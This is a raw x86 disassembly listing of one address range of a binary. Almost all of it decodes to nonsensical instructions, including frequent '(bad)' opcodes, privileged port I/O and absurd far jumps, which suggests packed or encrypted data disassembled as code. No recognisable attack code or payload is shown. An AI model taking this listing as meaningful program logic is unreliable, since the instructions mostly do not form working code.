  40eabc:	add    eax,esi
  40eabe:	jmp    0x40ee84
  40eac3:	icebp  
  40eac4:	jmp    0x40ea54
  40eac6:	imul   edx,DWORD PTR [edx+0x1973f175],0xbd83fe94
  40ead0:	loop   0x40ea63
  40ead2:	ins    BYTE PTR es:[edi],dx
  40ead3:	xchg   edi,eax
  40ead4:	lods   eax,DWORD PTR ds:[esi]
  40ead5:	jl     0x40eb53
  40ead7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ead8:	jns    0x40eb56
  40eada:	jl     0x40eb1c
  40eadc:	mov    ebx,0xaaaa412c
  40eae1:	dec    esp
  40eae2:	ins    DWORD PTR es:[edi],dx
  40eae3:	mov    es,WORD PTR [eax+ecx*4+0x34a3a84b]
  40eaea:	je     0x40eaad
  40eaec:	xor    ch,BYTE PTR [esi+0x752c3b7c]
  40eaf2:	mov    edx,ecx
  40eaf4:	adc    eax,0xf9f10743
  40eaf9:	adc    BYTE PTR [ecx-0x42625cef],0x36
  40eb00:	(bad)  
  40eb01:	dec    esp
  40eb02:	ficomp DWORD PTR [esp+ebx*2-0xf33f8b8]
  40eb09:	in     eax,dx
  40eb0a:	retf   
  40eb0b:	lea    edi,[edx+0x1f]
  40eb0e:	add    dl,ah
  40eb10:	out    dx,al
  40eb11:	test   BYTE PTR [eax+0xc],dh
  40eb14:	dec    esp
  40eb15:	jge    0x40ead8
  40eb17:	jecxz  0x40eb61
  40eb19:	rcl    BYTE PTR [esi-0x2da732f0],cl
  40eb1f:	rcr    edx,cl
  40eb21:	fist   DWORD PTR [ecx-0x6]
  40eb24:	inc    edi
  40eb25:	into   
  40eb26:	mov    eax,0xfd8c2a54
  40eb2b:	jmp    0x40eb6c
  40eb2d:	bound  esi,QWORD PTR [edx-0x3a52ecbb]
  40eb33:	das    
  40eb34:	lock jbe 0x40eb12
  40eb37:	pop    ebp
  40eb38:	sub    eax,0x25a917e4
  40eb3d:	pop    eax
  40eb3e:	int    0x54
  40eb40:	enter  0xc53c,0x7b
  40eb44:	push   esp
  40eb45:	and    eax,0x8a66f5d3
  40eb4a:	cmp    cl,BYTE PTR [edx]
  40eb4c:	pop    ebx
  40eb4d:	push   es
  40eb4e:	and    bl,BYTE PTR [edx+edi*4]
  40eb51:	sti    
  40eb52:	enter  0xf03e,0x11
  40eb56:	and    eax,0x9d74ff1c
  40eb5b:	sti    
  40eb5c:	test   al,0x16
  40eb5e:	xlat   BYTE PTR ds:[ebx]
  40eb5f:	pop    ecx
  40eb60:	mov    BYTE PTR [ebx+0x5e],bl
  40eb63:	rcr    edx,0xbb
  40eb66:	xchg   ebp,eax
  40eb67:	int3   
  40eb68:	mov    WORD PTR [edi],es
  40eb6a:	shl    DWORD PTR [edx],cl
  40eb6c:	push   eax
  40eb6d:	sar    BYTE PTR [ecx+0x69],cl
  40eb70:	sbb    eax,0x7d672193
  40eb75:	inc    edx
  40eb76:	fisub  DWORD PTR [edx+esi*4-0x29f404a3]
  40eb7d:	inc    esi
  40eb7e:	mov    DWORD PTR [ecx-0x5182464f],0x42094ddd
  40eb88:	xchg   edx,eax
  40eb89:	xor    si,WORD PTR [edx+eiz*4+0x59]
  40eb8e:	dec    edi
  40eb8f:	xchg   ebp,eax
  40eb90:	ret    0xc4ce
  40eb93:	mov    ds:0x700641d,eax
  40eb98:	out    dx,al
  40eb99:	sbb    dh,BYTE PTR [ecx+0x6f336503]
  40eb9f:	(bad)  
  40eba0:	ins    DWORD PTR es:[edi],dx
  40eba1:	or     eax,DWORD PTR ds:0xe42856ec
  40eba7:	mov    edx,0xb6cbf959
  40ebac:	in     eax,0x4d
  40ebae:	xchg   edi,eax
  40ebaf:	sbb    BYTE PTR [edi-0x27],cl
  40ebb2:	std    
  40ebb3:	rcl    BYTE PTR [esi-0x6c0e054c],1
  40ebb9:	jbe    0x40ebdb
  40ebbb:	dec    edx
  40ebbc:	(bad)  
  40ebbd:	mov    bh,BYTE PTR [ebp-0x4c]
  40ebc0:	ins    DWORD PTR es:[edi],dx
  40ebc1:	rcr    BYTE PTR [ecx+esi*8+0x23],0xcb
  40ebc6:	cmp    eax,0x86d1b427
  40ebcb:	sbb    DWORD PTR [edi+0x76a0cc25],edx
  40ebd1:	inc    ch
  40ebd3:	arpl   WORD PTR [eax-0x74],ax
  40ebd6:	or     esp,DWORD PTR [eax]
  40ebd8:	push   edx
  40ebd9:	aas    
  40ebda:	cmp    eax,0x25b4dbc2
  40ebdf:	or     al,0xb2
  40ebe1:	push   cs
  40ebe2:	push   esp
  40ebe3:	mov    edi,ebx
  40ebe5:	cmp    BYTE PTR [ecx],dl
  40ebe7:	std    
  40ebe8:	sahf   
  40ebe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebea:	lahf   
  40ebeb:	int    0xdd
  40ebed:	dec    ebp
  40ebee:	xor    eax,0x885fdba0
  40ebf3:	cmp    DWORD PTR ds:0x618a48cd,esi
  40ebf9:	cld    
  40ebfa:	jg     0x40ebb5
  40ebfc:	push   0x8fc36839
  40ec01:	and    DWORD PTR [edi+0x42],eax
  40ec04:	mov    edx,0xac7a63a3
  40ec09:	sbb    eax,0x67c36ab4
  40ec0e:	pop    ebx
  40ec0f:	mov    al,0xf8
  40ec11:	(bad)  
  40ec12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec13:	popf   
  40ec14:	out    0xb2,eax
  40ec16:	leave  
  40ec17:	and    eax,0x2a8ca446
  40ec1c:	mov    eax,0x230eaa39
  40ec21:	loope  0x40ec77
  40ec23:	jmp    0x40ebec
  40ec25:	mov    bh,0xd6
  40ec27:	xchg   esi,eax
  40ec28:	mov    ebx,0x2396bf70
  40ec2d:	jnp    0x40ec44
  40ec2f:	cwde   
  40ec30:	(bad)  
  40ec31:	sub    eax,0x70bbca4e
  40ec36:	aad    0x94
  40ec38:	int3   
  40ec39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec3a:	sub    DWORD PTR [ebx+ebp*2],edi
  40ec3d:	loop   0x40ebf6
  40ec3f:	xor    ebx,esp
  40ec41:	xor    edx,ecx
  40ec43:	lods   eax,DWORD PTR ds:[esi]
  40ec44:	imul   DWORD PTR [esi+ebx*4-0x3e]
  40ec48:	mov    ah,0x43
  40ec4a:	jp     0x40ebde
  40ec4c:	xchg   edx,eax
  40ec4d:	and    edi,DWORD PTR [edi+0x53c71925]
  40ec53:	mov    fs,WORD PTR [esi-0x915a4aa]
  40ec59:	idiv   DWORD PTR [eax-0x39d20889]
  40ec5f:	stos   BYTE PTR es:[edi],al
  40ec60:	out    dx,al
  40ec61:	test   al,0xa0
  40ec63:	jg     0x40ec1c
  40ec65:	clc    
  40ec66:	fldcw  WORD PTR [eax]
  40ec68:	jnp    0x40ebf1
  40ec6a:	stos   DWORD PTR es:[edi],eax
  40ec6b:	fadd   QWORD PTR [ebx-0x517c865e]
  40ec71:	fcomp  DWORD PTR [ecx+0x1e]
  40ec74:	mov    ch,0xd5
  40ec76:	imul   ebp,DWORD PTR [esi],0xffffffb0
  40ec79:	cmp    dl,BYTE PTR [ebp+0x23]
  40ec7c:	and    dl,BYTE PTR [edi-0x22919045]
  40ec82:	jne    0x40ec84
  40ec84:	sbb    BYTE PTR [ecx-0x3e1c1bc7],bl
  40ec8a:	push   cs
  40ec8b:	and    esi,DWORD PTR [eax-0x2d]
  40ec8e:	fldcw  WORD PTR [ebp*1-0x3bf95cbb]
  40ec95:	pusha  
  40ec96:	adc    ch,BYTE PTR [edi]
  40ec98:	sti    
  40ec99:	fucom  st(5)
  40ec9b:	fwait
  40ec9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec9d:	and    al,0x76
  40ec9f:	and    eax,ebx
  40eca1:	or     DWORD PTR [ebx],esp
  40eca3:	(bad)
  40eca7:	push   ecx
  40eca8:	repz loope 0x40ed09
  40ecab:	mov    edi,0x48020d8e
  40ecb0:	enter  0xe951,0xb9
  40ecb4:	xchg   edx,eax
  40ecb5:	inc    edi
  40ecb6:	push   0xffffffd5
  40ecb8:	mov    ah,0x4e
  40ecba:	jmp    0x40ec9f
  40ecbc:	mov    dl,0xe6
  40ecbe:	in     al,0xfe
  40ecc0:	mov    eax,0x50d75c30
  40ecc5:	sbb    ebx,DWORD PTR [eax+0xf23f92e]
  40eccb:	push   esi
  40eccc:	pop    ebx
  40eccd:	stos   BYTE PTR es:[edi],al
  40ecce:	mov    ebp,0x842b5e70
  40ecd3:	jno    0x40ec7d
  40ecd5:	jecxz  0x40ecd5
  40ecd7:	cmp    edi,DWORD PTR [ebp-0x1ff953eb]
  40ecdd:	rcl    BYTE PTR [esi+0x60],1
  40ece0:	push   eax
  40ece1:	and    BYTE PTR [esi],bl
  40ece3:	push   esi
  40ece4:	stos   DWORD PTR es:[edi],eax
  40ece5:	sar    BYTE PTR [ecx-0x422f519f],cl
  40eceb:	mov    al,ds:0xf98ebb25
  40ecf0:	lods   al,BYTE PTR ds:[esi]
  40ecf1:	daa    
  40ecf2:	mov    ecx,0x5bb4c460
  40ecf7:	jbe    0x40ed2e
  40ecf9:	je     0x40ed53
  40ecfb:	sub    eax,0x35d42284
  40ed00:	sets   ah
  40ed03:	jno    0x40ecab
  40ed05:	push   cs
  40ed06:	shl    BYTE PTR [esi-0x7c],0xaa
  40ed0a:	mov    dh,0x25
  40ed0c:	fild   QWORD PTR ds:0x75cf5e6c
  40ed12:	cwde   
  40ed13:	cs addr16 in al,dx
  40ed16:	push   esi
  40ed17:	cdq    
  40ed18:	xlat   BYTE PTR ds:[ebx]
  40ed19:	xchg   esi,eax
  40ed1a:	lds    ecx,FWORD PTR [esi]
  40ed1c:	or     BYTE PTR [edi-0x72477604],bl
  40ed22:	lock push edi
  40ed24:	leave  
  40ed25:	daa    
  40ed26:	xor    eax,0x8a459ce8
  40ed2b:	ja     0x40ecc9
  40ed2d:	dec    ebx
  40ed2e:	push   esp
  40ed2f:	push   ss
  40ed30:	in     al,dx
  40ed31:	jle    0x40ed13
  40ed33:	mov    edi,0x9286d10d
  40ed38:	retf   0xed51
  40ed3b:	xor    DWORD PTR [ebp-0x1e],esi
  40ed3e:	sahf   
  40ed3f:	(bad)  
  40ed40:	xor    eax,0x7d6907c4
  40ed45:	(bad)  
  40ed47:	xor    ecx,ecx
  40ed49:	popf   
  40ed4a:	(bad)  
  40ed4c:	out    0x86,eax
  40ed4e:	mov    ecx,0xed03d12
  40ed53:	dec    ebp
  40ed54:	outs   dx,DWORD PTR ds:[esi]
  40ed55:	mov    esi,ecx
  40ed57:	popf   
  40ed58:	inc    eax
  40ed59:	push   esp
  40ed5a:	ja     0x40edab
  40ed5c:	shl    BYTE PTR [ecx],1
  40ed5e:	xor    ebp,DWORD PTR [ecx-0x30593e5d]
  40ed64:	retf   
  40ed65:	mov    bl,ch
  40ed67:	pop    ds
  40ed68:	in     eax,dx
  40ed69:	jmp    0x641f537b
  40ed6e:	retf   0x4f8b
  40ed71:	mov    eax,DWORD PTR [esi+esi*1]
  40ed74:	jl     0x40eda2
  40ed76:	mov    ds:0x27b656e2,eax
  40ed7b:	and    DWORD PTR [ebx-0xd],ecx
  40ed7e:	dec    ebp
  40ed7f:	(bad)  [edi+0x76]
  40ed82:	pop    esp
  40ed83:	clc    
  40ed84:	retf   0x427d
  40ed87:	ror    DWORD PTR [esi],cl
  40ed89:	sub    ebx,esi
  40ed8b:	dec    esp
  40ed8c:	dec    ebp
  40ed8d:	dec    edi
  40ed8e:	jle    0x40edc8
  40ed90:	test   BYTE PTR [ecx+ecx*8+0x17],cl
  40ed94:	(bad)  
  40ed96:	or     dl,dh
  40ed98:	test   BYTE PTR [edx+0x37],dl
  40ed9b:	jecxz  0x40ed77
  40ed9d:	jmp    0x8883:0x91003f6c
  40eda4:	inc    edx
  40eda5:	(bad)  
  40eda7:	push   ebx
  40eda8:	cmc    
  40eda9:	je     0x40ed44
  40edab:	call   0xfd69f12a
  40edb0:	mov    cl,0x50
  40edb2:	push   es
  40edb3:	push   esi
  40edb4:	adc    ecx,DWORD PTR [edx]
  40edb6:	sub    DWORD PTR [esi],ecx
  40edb8:	cmp    eax,0x2e430199
  40edbd:	ins    DWORD PTR es:[edi],dx
  40edbe:	jle    0x40edf9
  40edc0:	mov    bl,0xcc
  40edc2:	scas   eax,DWORD PTR es:[edi]
  40edc3:	jl     0x40edfc
  40edc5:	jge    0x40ed67
  40edc7:	mov    dh,0x38
  40edc9:	out    dx,eax
  40edca:	int    0xac
  40edcc:	or     DWORD PTR [ecx+0x401dbe5],esi
  40edd2:	add    ah,BYTE PTR [ecx+0x64]
  40edd5:	mov    bh,0xfb
  40edd7:	fiadd  DWORD PTR [ebp+0xb]
  40edda:	xchg   edx,eax
  40eddb:	aas    
  40eddc:	pop    ecx
  40eddd:	fldenv [eax]
  40eddf:	into   
  40ede0:	out    dx,eax
  40ede1:	stc    
  40ede2:	add    al,0xa4
  40ede4:	ins    BYTE PTR es:[edi],dx
  40ede5:	push   ebx
  40ede6:	cmp    ebp,edx
  40ede8:	outs   dx,BYTE PTR ds:[esi]
  40ede9:	addr16 dec ecx
  40edeb:	data16 or al,0xbf
  40edee:	inc    ecx
  40edef:	pop    es
  40edf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edf1:	lds    eax,FWORD PTR [edx+0x1a6f5a0c]
  40edf7:	mov    BYTE PTR [edi+0x2a],ah
  40edfa:	adc    al,0x25
  40edfc:	dec    esi
  40edfd:	push   esi
  40edfe:	mov    gs,WORD PTR [ebx-0x43f3c483]
  40ee04:	sbb    eax,0xc1c1dab4
  40ee09:	jmp    0x9ca73965
  40ee0e:	dec    esp
  40ee0f:	mov    eax,ds:0x315e6b3b
  40ee14:	ins    DWORD PTR es:[edi],dx
  40ee15:	dec    esi
  40ee16:	xchg   ecx,eax
  40ee17:	sub    bh,al
  40ee19:	fdivr  st,st(5)
  40ee1b:	or     eax,0x1405b
  40ee20:	and    ebx,edx
  40ee22:	inc    esi
  40ee23:	push   0xffffffbe
  40ee25:	icebp  
  40ee26:	mov    ch,0x1f
  40ee28:	cmc    
  40ee29:	inc    edi
  40ee2a:	aaa    
  40ee2b:	inc    ebx
  40ee2c:	jnp    0x40ee56
  40ee2e:	mov    eax,0x33eca963
  40ee33:	push   0x28
  40ee35:	call   0x8d7d:0xb8dfa6bc
  40ee3c:	lahf   
  40ee3d:	rcl    BYTE PTR [esi-0x23],0x37
  40ee41:	dec    edx
  40ee42:	mov    al,ds:0xd5b41163
  40ee47:	shl    DWORD PTR [edx+0x77f75301],cl
  40ee4d:	jl     0x40edec
  40ee4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee50:	in     eax,dx
  40ee51:	add    ebp,edx
  40ee53:	mov    edx,0xa4f000d3
  40ee58:	adc    dh,BYTE PTR [ebp-0x6c]
  40ee5b:	push   ss
  40ee5c:	mov    cl,0x23
  40ee5e:	imul   edx,ebp,0x5b
  40ee61:	pop    ebp
  40ee62:	push   edx
  40ee63:	xor    BYTE PTR cs:[edi+0x7776d659],bl
  40ee6a:	data16 sub BYTE PTR [edi-0x28619778],bl
  40ee71:	cli    
  40ee72:	inc    edx
  40ee73:	inc    esi
  40ee74:	jge    0x4c6cc27
  40ee7a:	retf   0xfd9b
  40ee7d:	mov    ebx,0x1dcfce52
  40ee82:	add    al,cl
  40ee84:	mov    ds:0x413b9a,eax
  40ee89:	mov    eax,DWORD PTR [ebp-0x4]
  40ee8c:	xor    eax,edi
  40ee8e:	add    eax,esi
  40ee90:	mov    ds:0x413b92,eax
  40ee95:	jmp    0x40f25b
  40ee9a:	push   edi
  40ee9b:	mov    DWORD PTR ds:0x7d73cde7,eax
  40eea1:	test   eax,0x57232fd2
  40eea6:	jnp    0x40eeb2
  40eea8:	jmp    0x7cea2d1a
  40eead:	jl     0x40ee56
  40eeaf:	jns    0x40ef2d
  40eeb1:	jl     0x40eed0
  40eeb3:	std    
  40eeb4:	lods   eax,DWORD PTR ds:[esi]
  40eeb5:	out    dx,eax
  40eeb6:	mov    cl,0x29
  40eeb8:	xor    eax,0x2b9806c7
  40eebd:	out    dx,al
  40eebe:	fdivrp st(5),st
  40eec0:	push   0x25
  40eec2:	push   edx
  40eec3:	(bad)  
  40eec4:	sti    
  40eec5:	in     eax,0x3
  40eec7:	popa   
  40eec8:	daa    
  40eec9:	inc    ecx
  40eeca:	outs   dx,DWORD PTR ds:[esi]
  40eecb:	call   0x90d3:0xb990c966
  40eed2:	xor    BYTE PTR [esi],cl
  40eed4:	ins    DWORD PTR es:[edi],dx
  40eed5:	add    ch,BYTE PTR [edx]
  40eed7:	mov    WORD PTR [eax+0x5f3e679c],fs
  40eedd:	mov    ebp,0xfc604307
  40eee2:	mov    bl,0x2a
  40eee4:	sbb    al,0x10
  40eee6:	sahf   
  40eee7:	sbb    BYTE PTR [edi-0x7a],al
  40eeea:	leave  
  40eeeb:	out    0xaf,eax
  40eeed:	retf   
  40eeee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eeef:	cmp    al,0xdd
  40eef1:	jbe    0x40ef10
  40eef3:	int    0x49
  40eef5:	dec    ecx
  40eef6:	pop    ecx
  40eef7:	leave  
  40eef8:	push   ebx
  40eef9:	xchg   esi,eax
  40eefa:	repz sub al,0x6
  40eefd:	xchg   ebp,eax
  40eefe:	mov    ch,0x7e
  40ef00:	cmp    BYTE PTR [edx+0x7a],ch
  40ef03:	dec    edx
  40ef04:	test   DWORD PTR [edx-0x76],eax
  40ef07:	mov    ch,0x4d
  40ef09:	ins    BYTE PTR es:[edi],dx
  40ef0a:	dec    ecx
  40ef0b:	(bad)  
  40ef0c:	bound  esi,QWORD PTR [ebx]
  40ef0e:	cli    
  40ef0f:	fisttp QWORD PTR [esi+0x1d]
  40ef12:	xor    ecx,eax
  40ef14:	mov    bl,0xfa
  40ef16:	scas   al,BYTE PTR es:[edi]
  40ef17:	daa    
  40ef18:	(bad)  
  40ef1a:	dec    ecx
  40ef1b:	js     0x40eef7
  40ef1d:	pop    ecx
  40ef1e:	ss xchg esp,eax
  40ef20:	(bad)  
  40ef21:	call   0xc664:0xa66cd81
  40ef28:	add    al,0x6d
  40ef2a:	stos   DWORD PTR es:[edi],eax
  40ef2b:	fs dec eax
  40ef2d:	pop    esi
  40ef2e:	mov    DWORD PTR [ebx-0x75b66a01],eax
  40ef34:	test   eax,0x756bbf09
  40ef39:	(bad)  
  40ef3a:	xor    ecx,DWORD PTR [ebx+edi*4+0x3d]
  40ef3e:	push   ebp
  40ef3f:	(bad)  
  40ef40:	popf   
  40ef41:	scas   eax,DWORD PTR es:[edi]
  40ef42:	mov    gs,WORD PTR [ebp+0x39827396]
  40ef48:	dec    esp
  40ef49:	mov    ebx,0x21c7a6c0
  40ef4e:	xor    eax,0xeaf7b499
  40ef53:	out    dx,eax
  40ef54:	test   al,0x19
  40ef56:	push   0x2
  40ef58:	jmp    0x526ed3e6
  40ef5d:	das    
  40ef5e:	dec    esp
  40ef5f:	push   edi
  40ef60:	(bad)  
  40ef61:	(bad)  
  40ef62:	mov    esi,0x4d54d693
  40ef67:	mov    dl,0x55
  40ef69:	je     0x40efe1
  40ef6b:	fiadd  WORD PTR [edx]
  40ef6d:	mov    ds:0x706a54b6,eax
  40ef72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef73:	in     al,0xb3
  40ef75:	pop    ecx
  40ef76:	out    0xb8,al
  40ef78:	aad    0xd4
  40ef7a:	test   al,0x93
  40ef7c:	addr16 push ecx
  40ef7e:	fwait
  40ef7f:	sahf   
  40ef80:	ficom  WORD PTR [eax]
  40ef82:	jle    0x40efa4
  40ef84:	add    eax,0x926428cd
  40ef89:	loope  0x40efe5
  40ef8b:	mov    eax,0xdb6b9abc
  40ef90:	or     eax,0x9706653d
  40ef95:	push   edi
  40ef96:	jb     0x40efce
  40ef98:	push   es
  40ef99:	dec    BYTE PTR [esi+0xd]
  40ef9c:	xchg   DWORD PTR [ebx+0x68eb4556],esp
  40efa2:	out    0x33,al
  40efa4:	inc    edi
  40efa5:	sar    BYTE PTR [esi+0x79],cl
  40efa8:	outs   dx,BYTE PTR ds:[esi]
  40efa9:	inc    ebp
  40efaa:	loopne 0x40ef91
  40efac:	popf   
  40efad:	popa   
  40efae:	addr16 in eax,dx
  40efb0:	push   0x22453e5d
  40efb5:	adc    al,0xe4
  40efb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efb8:	add    eax,DWORD PTR [esi+0x2d]
  40efbb:	dec    ebp
  40efbc:	jecxz  0x40ef93
  40efbe:	arpl   bp,bx
  40efc0:	push   ss
  40efc1:	(bad)  
  40efc2:	lods   eax,DWORD PTR ds:[esi]
  40efc3:	call   0x6049:0x37200919
  40efca:	or     eax,DWORD PTR [ebp-0x2c21ce23]
  40efd0:	dec    eax
  40efd1:	mov    bl,0x2c
  40efd3:	mov    eax,DWORD PTR [ebx+0x34ec9e3e]
  40efd9:	pop    eax
  40efda:	mov    BYTE PTR [eax],0x33
  40efdd:	hlt    
  40efde:	dec    ebx
  40efdf:	popf   
  40efe0:	xchg   DWORD PTR [ebx+0x1a45ece1],edi
  40efe6:	rol    BYTE PTR [eax],0xe5
  40efe9:	pop    edx
  40efea:	cwde   
  40efeb:	in     al,0x5
  40efed:	mov    edx,0x29bb28b4
  40eff2:	sub    al,0xca
  40eff4:	ret    0x78eb
  40eff7:	xchg   BYTE PTR ss:[ebx],al
  40effa:	dec    esi
  40effb:	jmp    0x40f03d
  40effd:	sbb    al,0x7b
  40efff:	fdiv   DWORD PTR [esi-0x61d7500b]
  40f005:	leave  
  40f006:	ficomp WORD PTR [esi-0x52d9bb4]
  40f00c:	aas    
  40f00d:	cmp    eax,0x1b982dea
  40f012:	xlat   BYTE PTR ds:[ebx]
  40f013:	pop    ds
  40f014:	push   ecx
  40f015:	std    
  40f016:	dec    esp
  40f017:	nop
  40f018:	sub    eax,0x38b101d6
  40f01d:	mov    BYTE PTR [ebp-0x2f97c2c5],cl
  40f023:	int3   
  40f024:	retf   
  40f025:	and    eax,0xeeb36d09
  40f02a:	loopne 0x40f028
  40f02c:	fnstcw WORD PTR [ebx]
  40f02e:	inc    esi
  40f02f:	call   0x56dc:0x5b8fc88
  40f036:	inc    ebp
  40f037:	inc    ebx
  40f038:	fnsave [edi]
  40f03a:	fistp  DWORD PTR [ebx+0x327bd5ba]
  40f040:	fldenv [edi-0x34]
  40f043:	xor    bh,dh
  40f045:	mov    eax,ds:0x433a8fd9
  40f04a:	dec    ecx
  40f04b:	cli    
  40f04c:	adc    bl,BYTE PTR [esi-0x57]
  40f04f:	pushf  
  40f050:	push   cs
  40f051:	sub    ebx,eax
  40f053:	daa    
  40f054:	mov    BYTE PTR [edx+0x17],ah
  40f057:	jmp    0x308bf144
  40f05c:	xor    DWORD PTR [ecx],ecx
  40f05e:	push   ss
  40f05f:	mov    edx,0xf478e1d
  40f064:	jbe    0x40f085
  40f066:	fcomip st,st(1)
  40f068:	or     DWORD PTR [ecx],ecx
  40f06a:	and    al,0x54
  40f06c:	xchg   ebx,eax
  40f06d:	jae    0x40efef
  40f06f:	mov    esi,DWORD PTR [edx-0x20]
  40f072:	imul   esi,DWORD PTR [esi],0x18
  40f075:	and    al,0x92
  40f077:	inc    edi
  40f078:	icebp  
  40f079:	inc    esi
  40f07a:	mov    ds:0xfb95c568,eax
  40f07f:	test   al,0x6
  40f081:	imul   eax,DWORD PTR [ecx+0x47],0xb5754fc5
  40f088:	jbe    0x40f01d
  40f08a:	and    ebx,esi
  40f08c:	lds    ebp,FWORD PTR [ebx+0x30]
  40f08f:	in     al,0x52
  40f091:	jne    0x40f0ea
  40f093:	dec    ebp
  40f094:	sub    al,0xd9
  40f096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f097:	push   es
  40f098:	sar    eax,1
  40f09a:	sar    BYTE PTR [esi+0x1b2c831e],0x93
  40f0a1:	or     ecx,DWORD PTR [ebp-0x13]
  40f0a4:	popa   
  40f0a5:	rep lods eax,DWORD PTR ds:[esi]
  40f0a7:	fwait
  40f0a8:	(bad)  
  40f0a9:	sub    dl,dl
  40f0ab:	shl    DWORD PTR [esi],cl
  40f0ad:	imul   edx,esp,0xbf3b9580
  40f0b3:	ficom  WORD PTR [eax+0x40f8d2f6]
  40f0b9:	stos   DWORD PTR es:[edi],eax
  40f0ba:	mov    ah,0x55
  40f0bc:	ds (bad) 
  40f0be:	leave  
  40f0bf:	loope  0x40f129
  40f0c1:	jmp    0xe746:0x18ce7c1a
  40f0c8:	adc    bl,dh
  40f0ca:	pushf  
  40f0cb:	clc    
  40f0cc:	mov    ch,0xad
  40f0ce:	out    0xdb,eax
  40f0d0:	sub    eax,0xce5346be
  40f0d5:	lds    ebp,FWORD PTR ds:0xd7434f11
  40f0db:	scas   al,BYTE PTR es:[edi]
  40f0dc:	add    ah,BYTE PTR [ecx]
  40f0de:	push   esp
  40f0df:	mov    ebx,0x7d53ccc9
  40f0e4:	repz clc 
  40f0e6:	retf   0xf4e7
  40f0e9:	jns    0x40f105
  40f0eb:	xchg   esp,eax
  40f0ec:	rcl    al,cl
  40f0ee:	jae    0x40f115
  40f0f0:	push   ecx
  40f0f1:	xchg   esp,eax
  40f0f2:	sub    BYTE PTR [ebx],ah
  40f0f4:	mov    dl,0x63
  40f0f6:	(bad)  [edx+0x72b8faf1]
  40f0fc:	cmp    eax,0xae47e25f
  40f101:	imul   edx,DWORD PTR [ebp-0x40],0x4e
  40f105:	scas   al,BYTE PTR es:[edi]
  40f106:	xor    eax,0x199a11af
  40f10b:	jo     0x40f13a
  40f10d:	pop    edx
  40f10e:	mov    ebp,0xd8702cde
  40f113:	inc    eax
  40f114:	jns    0x40f0ed
  40f116:	shl    ebp,1
  40f118:	stos   BYTE PTR es:[edi],al
  40f119:	xchg   ebx,eax
  40f11a:	xor    eax,0x2c4f7127
  40f11f:	dec    eax
  40f120:	xchg   ebp,eax
  40f121:	out    0x6d,eax
  40f123:	sbb    DWORD PTR [esi],0x3a
  40f126:	pop    ecx
  40f127:	cld    
  40f128:	int    0x17
  40f12a:	mov    bl,ch
  40f12c:	push   ebp
  40f12d:	hlt    
  40f12e:	mov    edx,0x14bb5d73
  40f133:	mov    cl,0x9f
  40f135:	mov    ebp,0xb120a657
  40f13a:	sub    esi,ebp
  40f13c:	ret    0x325e
  40f13f:	test   DWORD PTR [ecx+0x32],esi
  40f142:	jmp    DWORD PTR ds:0x46d43b56
  40f148:	std    
  40f149:	add    eax,0xa7085907
  40f14e:	or     DWORD PTR [ebx+0x392f35e9],0x7c
  40f155:	iret   
  40f156:	mov    fs,WORD PTR [ebx-0x14bbd17f]
  40f15c:	jecxz  0x40f144
  40f15e:	idiv   DWORD PTR [eax-0x6b]
  40f161:	out    dx,eax
  40f162:	daa    
  40f163:	sbb    bh,BYTE PTR [esi-0x6a]
  40f166:	mov    bh,0xee
  40f168:	add    eax,0x84a7c1dc
  40f16d:	mov    ah,0xf7
  40f16f:	inc    ebx
  40f170:	jg     0x40f130
  40f172:	mov    eax,0x69c39808
  40f177:	test   DWORD PTR [edi],ebx
  40f179:	pop    ss
  40f17a:	pop    esi
  40f17b:	iret   
  40f17c:	int    0xfe
  40f17e:	aad    0x29
  40f180:	mov    dl,0xbb
  40f182:	jmp    0x2d07:0x54e65d2d
  40f189:	arpl   WORD PTR [edi+0x7bb108b8],si
  40f18f:	pushf  
  40f190:	pushf  
  40f191:	add    al,0x18
  40f193:	jno    0x40f17a
  40f195:	test   BYTE PTR [ecx],0x1f
  40f198:	rol    DWORD PTR [eax-0x25],0x34
  40f19c:	mov    WORD PTR [ecx],fs
  40f19e:	mov    dh,BYTE PTR [edx+0x43]
  40f1a1:	(bad)  
  40f1a2:	add    al,0x93
  40f1a4:	or     ch,BYTE PTR [eax]
  40f1a6:	cld    
  40f1a7:	sbb    al,BYTE PTR [ecx-0x5f]
  40f1aa:	out    dx,eax
  40f1ab:	rcr    DWORD PTR [edx],0x20
  40f1ae:	jbe    0x40f182
  40f1b0:	mov    ebp,0xa821fee6
  40f1b5:	sbb    al,0x1c
  40f1b7:	pop    ecx
  40f1b8:	test   DWORD PTR [edi-0x3b82b773],ebp
  40f1be:	or     eax,0x70e4065d
  40f1c3:	repnz add eax,0xa6c4a081
  40f1c9:	fcom   QWORD PTR [ecx+edx*1]
  40f1cc:	jle    0x40f15d
  40f1ce:	jb     0x40f168
  40f1d0:	mov    dh,ch
  40f1d2:	adc    bh,BYTE PTR [esi-0xb]
  40f1d5:	imul   ebx,edi,0xffffffc7
  40f1d8:	jns    0x40f209
  40f1da:	out    0xa1,eax
  40f1dc:	sbb    al,0x88
  40f1de:	add    eax,0x7c62ecef
  40f1e3:	stc    
  40f1e4:	out    0x1f,al
  40f1e6:	jnp    0x40f172
  40f1e8:	scas   eax,DWORD PTR es:[edi]
  40f1e9:	cli    
  40f1ea:	push   edi
  40f1eb:	scas   eax,DWORD PTR es:[edi]
  40f1ec:	xchg   edx,eax
  40f1ed:	ss push ds
  40f1ef:	sub    eax,0x31d157eb
  40f1f4:	imul   esi,DWORD PTR [ebp+ebx*4+0x34],0x66
  40f1f9:	sti    
  40f1fa:	daa    
  40f1fb:	fist   DWORD PTR ds:0x7131943d
  40f201:	mov    ecx,0xbf5adb2d
  40f206:	repnz iret 
  40f208:	fwait
  40f209:	mov    WORD PTR ss:[esi],fs
  40f20c:	sbb    edi,DWORD PTR [eax]
  40f20e:	(bad)  
  40f210:	push   ss
  40f211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f212:	push   es
  40f213:	xor    al,0xfa
  40f215:	xchg   ebx,esi
  40f217:	(bad)  
